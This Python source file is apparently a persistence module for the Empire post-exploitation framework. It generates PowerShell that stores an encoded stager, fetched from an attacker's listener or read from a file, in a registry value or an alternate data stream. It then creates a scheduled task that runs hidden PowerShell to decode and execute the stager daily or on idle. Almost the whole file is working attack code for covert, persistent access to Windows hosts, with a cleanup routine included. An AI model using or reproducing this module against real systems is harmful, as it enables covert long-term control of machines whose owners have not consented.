from pathlib import Path

from empire.server.common import helpers
from empire.server.common.empire import MainMenu
from empire.server.core.exceptions import ModuleValidationException
from empire.server.core.module_models import EmpireModule


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        # trigger options
        daily_time = params["DailyTime"]
        idle_time = params["IdleTime"]
        task_name = params["TaskName"]

        # storage options
        reg_path = params["RegPath"]
        ads_path = params["ADSPath"]

        # management options
        ext_file = params["ExtFile"]
        cleanup = params["Cleanup"]

        # staging options
        listener_name = params["Listener"]
        user_agent = params["UserAgent"]
        proxy = params["Proxy"]
        proxy_creds = params["ProxyCreds"]
        launcher_obfuscate = params["Obfuscate"].lower() == "true"
        launcher_obfuscate_command = params["ObfuscateCommand"]

        status_msg = ""
        location_string = ""

        # for cleanup, remove any script from the specified storage location
        #   and remove the specified trigger
        if cleanup.lower() == "true":
            if ads_path != "":
                # remove the ADS storage location
                if ".txt" not in ads_path:
                    raise ModuleValidationException(
                        "[!] For ADS, use the form C:\\users\\john\\AppData:blah.txt"
                    )

                script = (
                    'Invoke-Command -ScriptBlock {cmd /C "echo x > ' + ads_path + '"};'
                )
            else:
                # remove the script stored in the registry at the specified reg path
                path = "\\".join(reg_path.split("\\")[0:-1])
                name = reg_path.split("\\")[-1]

                script = "$RegPath = '" + reg_path + "';"
                script += "$parts = $RegPath.split('\\');"
                script += (
                    "$path = $RegPath.split(\"\\\")[0..($parts.count -2)] -join '\\';"
                )
                script += "$name = $parts[-1];"
                script += "$null=Remove-ItemProperty -Force -Path $path -Name $name;"

            script += "schtasks /Delete /F /TN " + task_name + ";"
            script += "'Schtasks persistence removed.'"
            return main_menu.modulesv2.finalize_module(
                script=script,
                script_end="",
                obfuscate=obfuscate,
                obfuscation_command=obfuscation_command,
            )

        if ext_file != "":
            # read in an external file as the payload and build a
            #   base64 encoded version as encScript
            ext_path = Path(ext_file)
            if ext_path.exists():
                file_data = ext_path.read_text()

                # unicode-base64 encode the script for -enc launching
                enc_script = helpers.enc_powershell(file_data)
                status_msg += "using external file " + ext_file

            else:
                raise ModuleValidationException("File does not exist: " + ext_file)

        elif not main_menu.listenersv2.get_active_listener_by_name(listener_name):
            # not a valid listener, return nothing for the script
            raise ModuleValidationException("Invalid listener: " + listener_name)

        else:
            # generate the PowerShell one-liner with all of the proper options set
            launcher = main_menu.stagergenv2.generate_launcher(
                listener_name=listener_name,
                language="powershell",
                encode=True,
                obfuscate=launcher_obfuscate,
                obfuscation_command=launcher_obfuscate_command,
                user_agent=user_agent,
                proxy=proxy,
                proxy_creds=proxy_creds,
                bypasses=params["Bypasses"],
            )

            enc_script = launcher.split(" ")[-1]
            status_msg += "using listener " + listener_name

        if ads_path != "":
            # store the script in the specified alternate data stream location
            if ".txt" not in ads_path:
                raise ModuleValidationException(
                    "[!] For ADS, use the form C:\\users\\john\\AppData:blah.txt"
                )

            script = (
                'Invoke-Command -ScriptBlock {cmd /C "echo '
                + enc_script
                + " > "
                + ads_path
                + '"};'
            )

            location_string = "$(cmd /c ''''more < " + ads_path + "'''''')"

        else:
            # otherwise store the script into the specified registry location
            path = "\\".join(reg_path.split("\\")[0:-1])
            name = reg_path.split("\\")[-1]

            status_msg += " stored in " + reg_path

            script = "$RegPath = '" + reg_path + "';"
            script += "$parts = $RegPath.split('\\');"
            script += "$path = $RegPath.split(\"\\\")[0..($parts.count -2)] -join '\\';"
            script += "$name = $parts[-1];"
            script += (
                "$null=Set-ItemProperty -Force -Path $path -Name $name -Value "
                + enc_script
                + ";"
            )

            # note where the script is stored
            location_string = "(gp " + path + " " + name + ")." + name

        # built the command that will be triggered by the schtask
        trigger_cmd = (
            "'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NonI -W hidden -c \\\"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String("
            + location_string
            + ")))\\\"'"
        )

        # sanity check to make sure we haven't exceeded the cmd.exe command length max
        MAX_CMD_LENGTH = 259
        if len(trigger_cmd) > MAX_CMD_LENGTH:
            raise ModuleValidationException(
                "[!] Warning: trigger command exceeds the maximum of 259 characters."
            )

        if idle_time != "":
            script += (
                "schtasks /Create /F /SC ONIDLE /I "
                + idle_time
                + " /TN "
                + task_name
                + " /TR "
                + trigger_cmd
                + ";"
            )
            status_msg += " with " + task_name + " idle trigger on " + idle_time + "."

        else:
            # otherwise assume we're doing a daily trigger
            script += (
                "schtasks /Create /F /SC DAILY /ST "
                + daily_time
                + " /TN "
                + task_name
                + " /TR "
                + trigger_cmd
                + ";"
            )
            status_msg += " with " + task_name + " daily trigger at " + daily_time + "."

        script += "'Schtasks persistence established " + status_msg + "'"

        return main_menu.modulesv2.finalize_module(
            script=script,
            script_end="",
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
